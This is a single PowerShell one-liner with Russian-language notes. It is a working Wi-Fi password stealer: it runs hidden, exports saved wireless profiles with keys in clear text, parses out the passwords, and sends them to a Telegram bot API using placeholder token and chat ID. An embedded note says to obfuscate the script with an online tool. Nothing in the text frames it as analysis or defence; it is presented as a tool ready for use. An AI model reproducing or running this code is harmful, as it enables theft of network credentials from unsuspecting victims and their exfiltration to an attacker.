powershell -NoP -W Hidden -C "закодировать следуюшее в https://powershellobfuscator.com/ с настройкой последний раздел вкл $token = "BOT_TOKEN"; $chatId = "CHAT_ID"; $api = "https://api.telegram.org/bot$token/sendMessage"; $tempFolder = New-Item -Path $env:TEMP -Name "collector" -ItemType Directory -Force; Set-Location -Path $tempFolder.FullName; netsh wlan export profile key=clear; $passwords_clean = @(); Get-ChildItem -Path $tempFolder.FullName -Filter "*.xml" | ForEach-Object { $xmlPath = $_.FullName; $networkName = $_.BaseName -replace 'Беспроводная сеть-', ''; [xml]$xmlContent = Get-Content $xmlPath; $keyMaterial = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial; $passwords_clean += "$networkName : $keyMaterial"; }; $payload = "!!! Собранные Wi-Fi пароли: `n`n$($passwords_clean -join "`n")"; iwr -Uri $api -Method Post -Body @{ chat_id = $chatId; text = $payload } -UseBasicParsing; exit"